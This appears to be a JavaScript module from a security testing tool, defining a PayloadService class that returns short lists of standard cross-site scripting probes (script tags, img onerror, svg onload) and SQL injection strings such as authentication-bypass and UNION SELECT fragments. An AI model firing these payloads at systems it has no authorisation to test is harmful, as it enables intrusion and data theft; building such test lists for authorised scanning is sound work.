class PayloadService {

 static getXSSPayloads() {

  return [
   "<script>alert(1)</script>",
   "\"><script>alert(1)</script>",
   "<img src=x onerror=alert(1)>",
   "<svg/onload=alert(1)>"
  ];

 }

 static getSQLiPayloads() {

  return [
   "' OR '1'='1",
   "' OR 1=1--",
   "' UNION SELECT NULL--",
   "admin'--"
  ];

 }

}

module.exports = PayloadService;